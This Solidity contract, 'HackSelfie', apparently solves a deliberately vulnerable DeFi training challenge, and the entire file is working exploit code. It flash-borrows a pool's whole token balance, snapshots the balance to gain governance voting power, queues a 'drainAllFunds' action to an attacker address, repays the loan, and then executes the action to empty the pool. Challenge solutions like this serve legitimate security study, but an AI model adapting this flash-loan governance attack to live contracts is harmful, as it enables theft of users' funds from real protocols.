// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(uint256 borrowAmount) external;
}

interface IGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

interface IDVT is IERC20 {
    function snapshot() external returns (uint256);
}

contract HackSelfie {
    IPool immutable pool;
    IDVT immutable token;
    IGovernance immutable governance;
    address immutable attacker;
    uint256 id;

    constructor(
        address _pool,
        address _token,
        address _governance,
        address _attacker
    ) {
        pool = IPool(_pool);
        token = IDVT(_token);
        governance = IGovernance(_governance);
        attacker = _attacker;
    }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));
    }

    function drain() external {
        governance.executeAction(id);
    }

    function receiveTokens(address _token, uint256 _amount) external {
        token.snapshot();
        id = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", attacker),
            0
        );
        IERC20(_token).transfer(msg.sender, _amount);
    }
}
